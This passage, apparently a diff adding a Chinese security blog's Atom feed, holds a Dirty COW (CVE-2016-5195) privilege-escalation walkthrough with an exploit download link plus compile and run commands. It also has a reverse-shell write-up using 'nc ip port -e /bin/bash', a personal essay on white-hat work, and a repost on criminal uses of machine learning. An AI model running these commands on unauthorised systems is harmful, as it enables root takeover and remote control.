+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53ly1fnwbl9mn08j30ic0hbmxk.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>dirtyc0w_Linux提权</title>
+    <link href="http://yoursite.com/2018/01/28/dirtyc0w-Linux%E6%8F%90%E6%9D%83/"/>
+    <id>http://yoursite.com/2018/01/28/dirtyc0w-Linux提权/</id>
+    <published>2018-01-28T05:50:05.000Z</published>
+    <updated>2018-08-05T06:36:17.517Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwa6chcg4j30b40aawhp.jpg" alt=""><br><a id="more"></a></p><h3 id="漏洞编号："><a href="#漏洞编号：" class="headerlink" title="漏洞编号："></a>漏洞编号：</h3><pre><code>CVE-2016-5195</code></pre><h3 id="漏洞名称："><a href="#漏洞名称：" class="headerlink" title="漏洞名称："></a>漏洞名称：</h3><pre><code>Dirty COW</code></pre><h3 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h3><p>低权限用户利用该漏洞可以在众多<code>Linux</code>系统上实现本地提权</p><h3 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h3><p><code>Linux kernel &gt;= 2.6.22</code>（<code>2007</code>年发行，到今年<code>10</code>月<code>18</code>日才修复）</p><h3 id="漏洞概述："><a href="#漏洞概述：" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>该漏洞具体为，<code>Linux</code>内核的内存子系统在处理写入时复制<code>（copy-on-write, COW）</code>时产生了竞争条件<code>（race condition）</code>。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。<code>（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.）</code></p><p>竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得<code>root</code>权限。</p><p>根据官方发布的补丁信息，这个问题可以追溯到<code>2007</code>年发布的<code>Linux</code>内核。现在还没有任何证据表明，<code>2007</code>年后是否有黑客利用了这个漏洞。不过安全专家<code>Phil Oester</code>称发现一名攻击者利用该漏洞部署攻击，并向<code>Red Hat</code>通报了最近的攻击事件。</p><h3 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h3><p>进行<code>Linux</code>内核维护的<code>Greg Kroah-Hartman</code>宣布针对<code>Linux 4.8、4.7</code>和<code>4.4 LTS</code>内核系列的维护更新（更新后为<code>Linux kernel 4.8.3、4.7.9</code>和<code>4.4.26 LTS</code>），修复了该漏洞。目前新版本已经登录各GNU/Linux发行版库，包括Arch Linux（测试中）、<code>Solus</code>和所有受支持版本的Ubuntu。Debian开发人员前天也宣布稳定版<code>Debian GNU/Linux 8 “Jessei”</code>系列内核重要更新——本次更新总共修复4个<code>Linux</code>内核安全漏洞，其中也包括了脏牛。</p><p>各操作系统供应商应该即刻下载<code>Linux kernel 4.8.3</code>、<code>Linux kernel 4.7.9</code>和<code>Linux kernel 4.4.26 LTS</code>，为用户提供稳定版渠道更新。</p><p>软件开发人员可以通过<code>https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619</code> 重新编译<code>Linux</code>修复此漏洞。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="http://ys-k.ys168.com/575740248/l6J277L3I4JLH7TjsKkJ/dirty.zip" title="dirty.zip" target="_blank" rel="noopener">http://ys-k.ys168.com/575740248/l6J277L3I4JLH7TjsKkJ/dirty.zip</a></p><h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwacrpkjvj30dj02c0sh.jpg" alt=""></p><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p><code>gcc -pthread dirty.c -o dirty -lcrypt</code></p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><pre><code> chmod 777 dirty./dirty yourpassword</code></pre><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnyx5sh1ylj30a0043a9u.jpg" alt=""></p><p>由于需要竞争，所以执行提权exp之后需要等待一段时间。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnyx6b1duoj30if0cqdgs.jpg" alt=""></p><h4 id="原来的权限："><a href="#原来的权限：" class="headerlink" title="原来的权限："></a>原来的权限：</h4><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwah1584hj30de04pq2p.jpg" alt=""></p><h4 id="用脏牛提权后的权限："><a href="#用脏牛提权后的权限：" class="headerlink" title="用脏牛提权后的权限："></a>用脏牛提权后的权限：</h4><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwahpjw44j30i006u745.jpg" alt=""></p><p><code>uid = 0 root</code>权限</p><p>如果是在反弹的 <code>shell</code> 里执行 直接连接 <code>ssh</code></p><p>别忘了恢复原来的<code>passwd</code> 文件</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnwam12maoj30d2032we9.jpg" alt=""></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>学会了脏牛漏洞提权linux的方法</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53ly1fnwa6chcg4j30b40aawhp.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>记一次linux反弹shell</title>
+    <link href="http://yoursite.com/2018/01/27/%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E5%8F%8D%E5%BC%B9shell/"/>
+    <id>http://yoursite.com/2018/01/27/记一次linux反弹shell/</id>
+    <published>2018-01-27T04:30:53.000Z</published>
+    <updated>2018-08-05T06:36:17.525Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp83hz9p8dj30je08rwg2.jpg" alt=""></p><a id="more"></a><p>Linux 反弹shell,一直都有听说过，可惜自己不会。今天受xz指点，学会了。特记录一下。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2976wsfj30md03zjr7.jpg" alt=""></p><p><code>root</code>权限，非常好，省得提权了。</p><p>由于Linux<code></code>我们在<code>webshell</code>里面是不好进行交互的，所以我们需要进行反弹<code>shell</code>操作。</p><p>首页我们通过<code>webshell</code>上传<code>nc</code>源码到<code>linux</code>服务器上</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2c7fxvbj30lf06e745.jpg" alt=""></p><p>然后我们进行解压、编译操作</p><p> <code>tar -zxvf /tmp/nc/netcat.tar.gz -C /tmp/nc</code></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv2evqruxj30t50i50tb.jpg" alt=""></p><p>由于在webshell里面无法切换目录，而编译文件需要在源码目录下进行。<br>所以我们可以编写一个sh脚本，让它执行编译操作。</p><p><code>/tmp/nc/netcat-0.7.1/./configure --prefix=/tmp/nc/netcat/ &amp;&amp; make &amp;&amp; make install</code></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3drbz77j30hi0gj747.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3ejo1y1j30hv07n746.jpg" alt=""></p><p>最后就是最重要的看点，<code>linux</code>反弹<code>shell</code>。</p><p>服务端执行如下命令：</p><pre><code>nc ip port -e /bin/bash</code></pre><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3mcwt9ej30k1053wee.jpg" alt=""></p><p>攻击端进行监听：</p><pre><code>nc -lvvp 6666</code></pre><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnv3mz4h1hj30gq03ojra.jpg" alt=""></p><p>反弹<code>shell</code>成功</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fp83hz9p8dj30je08rwg2.jpg" alt=""></p><p><br><br><strong>总结</strong>：</p><ul><li>学会请教人，自己不会，但可以请教有经验的人把它学会。</li><li>方法很重要</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006Y6f53gy1fp83hz9p8dj30je08rwg2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>曾经的初心还在吗</title>
+    <link href="http://yoursite.com/2018/01/24/%E6%9B%BE%E7%BB%8F%E7%9A%84%E5%88%9D%E5%BF%83%E8%BF%98%E5%9C%A8%E5%90%97/"/>
+    <id>http://yoursite.com/2018/01/24/曾经的初心还在吗/</id>
+    <published>2018-01-23T17:09:15.000Z</published>
+    <updated>2018-08-05T06:36:17.521Z</updated>
+    
+    <content type="html"><![CDATA[<p>不好意思，这是篇水文，愿意看的可以点开看，不愿看的我不强求。</p><a id="more"></a><p>曾经的初心还在吗？</p><p>这个答案乌云在的时候告诉了我们，是在的。</p><p><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnr1p9484hj30u01hcwl0.jpg" alt=""></p><p>我很认同乌云的理念，同时也觉得真正的白帽子是帮助修复漏洞，而不是去一味的索取利益，我本人在现实生活中是一个非常内向的人，也不喜欢去说话，和别人一起玩，所以上网成了我最大的乐趣，我无意中进入了乌云网，我查看申通快递的公开漏洞，但是我很惊讶，他们竟然没修复，这将导致所有看到此漏洞的人或者已经知道此漏洞的人都能随意进入他们的系统，查看或者窃取信息。这是非常不安全的。我心里就有种感觉，我想要帮助他们修复漏洞。</p><p>于是便开始了我的白帽之路，我不断提交漏洞，通宵达旦提交漏洞。到今天我都觉得这是自豪的，是有意义的。</p><p>等到三个月后，我成了普通白帽子，然后乌云也挂了。之前乌云开白帽大会，可惜我没去，我真应该去的，毕竟那应该算是最后一次了。<br><img src="https://ws1.sinaimg.cn/large/006Y6f53ly1fnr20a31bkj30u01hc11t.jpg" alt=""></p><p>我要感谢乌云，在他挂了的前夕，有人找我买乌币，我记得很清楚，虽然那是一年多以前的事了，360元人民币，可能不是很多，但那是我挣的，完完全全没靠别人。</p><p>成也萧何败也萧何，乌云还在升级。</p><p>可是生活必须继续</p><p>今天我爸跟我说，你每天看这些东西有什么用，能有碗饭吃才是最重要的。</p><p>是的，我长大了，我该挣钱养家了。我现实了，没那么理想主义了。</p><p>纵使那些网站被黑了，跟我也没多大关系。因为现在有了网络安全法，人家可能不会感谢你，还可能会告你，既然这样的话，那是没有任何价值的。</p><p>乌云生于乱世，又在一种平静的乱世中默默升级。</p><p>现在可能不会多少人记得乌云了。但是我记得。它的理念，它带给整个信息安全行业的发展，时至今日，它的很多公开漏洞都还是有效，因为他们不会去修复，也没有乌云这样的漏洞提交平台去提醒他们了。</p><p>我从小就有个理想，以黑客手段对抗黑客。</p><p>你既然都知道黑客是用什么手段在攻击，那么防护也不是什么难事。</p><p>黑客用什么手段攻击你的，从哪里攻击你的，你都一清二楚了。防护还需要说啥。</p><p>古人云：知己知彼，方能百战不殆。</p><p>最后，我想说，曾经的初心一直在心中（昨天看见某网站被做了360ssp,心里很不爽，还是把它删了），只是默默守护，不再说出口了。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;不好意思，这是篇水文，愿意看的可以点开看，不愿看的我不强求。&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>利用机器学习实施网络犯罪</title>
+    <link href="http://yoursite.com/2018/01/23/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%96%BD%E7%BD%91%E7%BB%9C%E7%8A%AF%E7%BD%AA/"/>
+    <id>http://yoursite.com/2018/01/23/利用机器学习实施网络犯罪/</id>
+    <published>2018-01-23T07:29:56.000Z</published>
+    <updated>2018-08-05T06:36:17.525Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://github.com/sky666sec/sky666sec.github.io/blob/hexo/Figure%20Bed/006Y6f53ly1fnqkj1ookfj30fa0a3758.jpg?raw=true" alt=""></p><a id="more"></a><h3 id="网络犯罪分子如何利用机器学习？"><a href="#网络犯罪分子如何利用机器学习？" class="headerlink" title="网络犯罪分子如何利用机器学习？"></a>网络犯罪分子如何利用机器学习？</h3><p>犯罪分子越来越有组织地在 暗网 上提供广泛的服务，而且考虑到机器和深度学习等技术尚未开发的潜力，未来创新速度比安全防御能力更快。<code>McAfee</code>公司首席技术官<code>Steve Grobman</code>表示：</p><blockquote><p>“我们必须认识到，尽管机器学习、深度学习和 人工智能 等技术将成为未来网络防御的基石，但我们的对手正在竭尽全力地实施和创新它们。</p></blockquote><blockquote><p>“ 网络安全 常常是这样，技术放大的人类智能将成为攻击者和防守者之间军备竞赛的胜利因素。” </p></blockquote><p>这自然导致人们担心这是<code>AI</code>与<code>AI</code>，终结者的风格。赛门铁克首席技术官<code>Nick Savvides</code>表示，这是“网络安全领域人工智能与人工智能的第一年”，攻击者能够更有效地探索受损网络，这显然使安全厂商有责任建立更多的自动化和智能解决方案。<code>Darktrace</code>的技术总监戴夫·帕尔默<code>（Dave Palmer）</code>在去年底与这位作家交谈时强调道。</p><blockquote><p>“自主反应是网络安全的未来，</p></blockquote><blockquote><p>算法可以采取智能和针对性的补救行动，减缓甚至停止正在进行的攻击，同时仍然允许正常的业务活动继续进行。</p></blockquote><blockquote><p><code>2018</code>网络安全发展趋势， 人工智能与攻防<code>PK</code></p></blockquote><p>在这个时候，基于机器学习的攻击在很大程度上仍然是闻所未闻的，但一些技术已经被犯罪集团利用。</p><h4 id="1-恶意软件免杀能力越来越强"><a href="#1-恶意软件免杀能力越来越强" class="headerlink" title="1.恶意软件免杀能力越来越强"></a>1.恶意软件免杀能力越来越强</h4><p>对 网络犯罪 分子来说，恶意软件的创建主要是个手动过程。他们编写脚本来弥补总总不足，推动电脑病毒和木马，<code>rootkit</code>，密码破解和其他工具的协助分发和执行。这在恶意软件攻击中较为常见，但是如果他们能加速这个过程呢？机器学习可以帮助创建 恶意软件 吗？</p><p>第一个已知的使用机器学习来创建恶意软件的例子，是在2017年发表的一篇题为“基于<code>GAN</code>的黑盒攻击产生敌手恶意软件实例”的论文中。作者在报告中揭示了他们如何构建一个生成式对抗网络（<code>GAN</code> ）的算法，来生成敌对恶意软件样本，这些样本能够绕过基于机器学习的检测系统。</p><p>又如，在<code>DEFCON 2017</code>大会上，安全公司<code>Endgame</code>透露了如何使用<code>Elon Musk</code>的<code>OpenAI</code>框架创建定制的恶意软件，以创建安全引擎无法检测到的恶意软件。<code>Endgame</code>的研究是基于看起来有恶意的二进制文件，并且通过改变一些部分，最终生成的代码在防病毒引擎看来是良性和可信的。请参看 用机器学习创建恶意软件突破防病毒软件， 目前在实验中有<code>16%</code>的成功机率</p><p>与此同时，其他研究人员预测，机器学习最终可能会被用来“根据实验室中检测到的内容，随时修改代码”，这是对多态恶意软件的扩展。</p><h4 id="2-智能僵尸网络可扩展攻击规模"><a href="#2-智能僵尸网络可扩展攻击规模" class="headerlink" title="2.智能僵尸网络可扩展攻击规模"></a>2.智能僵尸网络可扩展攻击规模</h4><p><code>Fortinet</code>认为，<code>2018</code>年将是自学习“蜂巢网络<code>Hivenets</code>”和“机器人集群<code>swarmbots</code>”的一年，实质上标志着“智能”物联网设备可以被攻击者利用，实施大规模攻击易受攻击系统。<code>Fortinet</code>全球安全策略师<code>Derek Manky</code>表示：</p><blockquote><p>“他们将能够相互交流，并根据当地情报采取行动。“另外， 僵尸网络 会变得聪明，根据命令行事，而无需人工操纵。</p></blockquote><blockquote><p>因此，蜂巢网络将能够以群集的速度成倍增长，扩大其同时攻击多个受害者的能力，并显着阻碍防守方的缓解和响应动作。“</p></blockquote><blockquote><p><code>2018</code>网络安全发展趋势 人工智能与攻防<code>PK</code></p></blockquote><p>有趣的是，<code>Manky</code>说这些攻击还没有使用<code>swarm</code>技术，这项可以使这些蜂巢网络<code>Hivenet</code>从他们过去的行为中自我学习。作为人工智能的一个子领域，<code>swar</code>m技术被定义为“分散的、自组织的系统，自然的或人造的集体行为”，现在已经用于无人机和羽翼未丰的机器人设备中。（编者按：虽然是未来派的小说，但有些人可以从<code>“Black Mirror’s Hated in The Nation ”</code>中的<code>swarm</code>技术的犯罪可能性中得出结论，那里有成千上万的自动化蜜蜂，因为监视和物理攻击而受到威胁。）</p><h4 id="3-先进的鱼叉式网络钓鱼邮件变得更聪明"><a href="#3-先进的鱼叉式网络钓鱼邮件变得更聪明" class="headerlink" title="3.先进的鱼叉式网络钓鱼邮件变得更聪明"></a>3.先进的鱼叉式网络钓鱼邮件变得更聪明</h4><p>敌对机器学习的一个更明显的应用，是使用文本到语音转换、语音识别和自然语言处理<code>（NLP）</code>等智能 社会工程 算法。毕竟，通过经常性的神经网络，你已经可以形成这样的软件写作风格，所以理论上 钓鱼邮件 可以变得更复杂和可信。</p><p>特别是，机器学习可以促进高级鱼叉式 网络钓鱼 电子邮件针对高调的数字，同时整个过程自动化。系统可以接受真正的电子邮件培训，并学习如何使看起来和阅读的东西令人信服。</p><p>在<code>McAfee Labs</code>对<code>2017</code>年的预测中，该公司表示，犯罪分子将越来越多地利用机器学习来分析大量被盗记录，从而识别潜在的受害者，并能够针对这些个人，构建非常有效地、内容详尽的电子邮件。</p><p>此外，在<code>2016</code>年美国黑帽会议上，<code>John Seymour</code>和<code>Philip Tully</code>发表了一篇名为“社会工程数据科学的武器化：<code>Twitter</code>上的自动化E2E鱼叉式网络钓鱼”的论文，其中介绍了一种经常性的神经网络，学习如何向特定用户发布网络钓鱼信息。在这篇论文中，他们提出经过 鱼叉式攻击 钓鱼 渗透测试 数据训练的<code>SNAP_R</code>神经网络，是动态的从目标用户时间线帖子（以及他们发送或者关注的用户）中获取主题，以便更容易触发潜在受害者点击链接。</p><p>随后的测试表明，这个系统非常有效。在涉及<code>90</code>个用户的测试中，该框架的成功率在<code>30％</code>到<code>60％</code>之间变化，对手动钓鱼和群发钓鱼的结果有相当大的改进。</p><h4 id="4-威胁情报可能被“提高噪声基线”技术糊弄"><a href="#4-威胁情报可能被“提高噪声基线”技术糊弄" class="headerlink" title="4.威胁情报可能被“提高噪声基线”技术糊弄"></a>4.威胁情报可能被“提高噪声基线”技术糊弄</h4><p>在机器学习方面， 威胁情报 可以说是一种混合的祝福。一方面，普遍接受的是，在误报时代，机器学习系统将有助于分析人员识别来自多个系统的真实威胁。<code>Recorded Future</code>首席技术官兼联合创始人<code>StaffanTruvé</code>在最近的一份白皮书中表示：</p><blockquote><p>“应用机器学习在威胁情报领域有两个显着的增长。</p></blockquote><blockquote><p>“首先，处理和构建如此庞大的数据，包括对其中复杂关系的分析，几乎不可能单靠人力来解决。用更有能力的人来训练机器，意味着你可以更有效的武装起来，比以往任何时候都更有能力揭示和回应新出现的威胁。”</p></blockquote><blockquote><p>“其次是自动化 - 让机器承担人类可以毫无问题地完成的任务，并利用这项技术扩大到更大的数量处理量。”</p></blockquote><p>然而，也有这样的信念，即犯罪分子会再次适应这些警报。迈克菲的<code>Grobman</code>之前曾指出过一种被称为“提高噪声基线”的技术。黑客会利用这种技术来轰击环境，从而对常见的机器学习模型产生大量的误报。一旦目标重新校准其系统以滤除误报，攻击者就可以发起真正的攻击，可以通过机器学习系统获得。（小编，嗯？这是个挺有意思的想法，对于机器自学习及安全基线的设备有影响）</p><h4 id="5-更有效的进行未授权访问"><a href="#5-更有效的进行未授权访问" class="headerlink" title="5.更有效的进行未授权访问"></a>5.更有效的进行未授权访问</h4><p><code>2012</code>年，研究人员<code>Claudia Cruz</code>，<code>Fernando Uceda</code>和<code>Leobardo Reyes</code> 发表了一个机器学习安全攻击的早期例子。他们使用支持向量机（<code>SVM）</code>来打破在<code>reCAPTCHA</code>图像上运行的系统，精度为<code>82％</code>。所有验证码机制随后得到改进，只有研究人员再次深入学习才能打破验证码。<code>2016</code>年，发表了一篇文章，详细介绍了如何使用深度学习以<code>92％</code>的准确率打破简单验证码。</p><p>另外，去年 <code>BlackHat</code> 的“我是机器人”研究揭示了研究人员如何打破最新的语义图像<code>CAPTCHA</code>，并比较了各种机器学习算法。该文件承诺打破<code>Google</code>的reCAPTCHA准确率为<code>98％</code>。<code>2017</code>年<code>10</code>月，<code>unCAPTCHA</code>和<code>AIBot</code>成功突破<code>google recapcha</code>验证码， <code>5</code>秒多突破<code>450</code>个成功率<code>85%</code>。（这点我很赞同，因为我之前提出过一个这样的一个想法，就是用机器学习来识别验证码。）</p><h4 id="6-对机器学习引擎的输入数据投毒"><a href="#6-对机器学习引擎的输入数据投毒" class="headerlink" title="6.对机器学习引擎的输入数据投毒"></a>6.对机器学习引擎的输入数据投毒</h4><p>一个更加简单而有效的技术是，用于检测恶意软件的机器学习引擎可能被毒害，使得它不起作用，就像过去犯罪分子对反病毒引擎所做的一样。这听起来很简单，机器学习模型从输入数据中学习，如果数据池中毒，则输出也中毒。来自纽约大学的研究人员展示了卷积 神经网络 <code>（CNN）</code>如何能够通过<code>CNN</code>如<code>Google</code>、微软和<code>AWS</code>产生这些虚假（但受控制的）结果。 <code>2018</code>网络安全发展趋势 ，人工智能与攻防<code>PK</code>。</p><p>参考：<a href="http://toutiao.secjia.com/hacker-ml" target="_blank" rel="noopener">http://toutiao.secjia.com/hacker-ml</a></p><p>本文由：csoonline 发布，版权归属于原作者。 </p><p><strong>总结：</strong></p><ul><li>未来更多是AI(人工智能)与攻防对抗。</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://github.com/sky666sec/sky666sec.github.io/blob/hexo/Figure%20Bed/006Y6f53ly1fnqkj1ookfj30fa0a3758.jpg?raw=true&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="notes" scheme="http://yoursite.com/categories/notes/"/>
+    
+    
+      <category term="notes" scheme="http://yoursite.com/tags/notes/"/>
+    
+  </entry>
+  
+</feed>
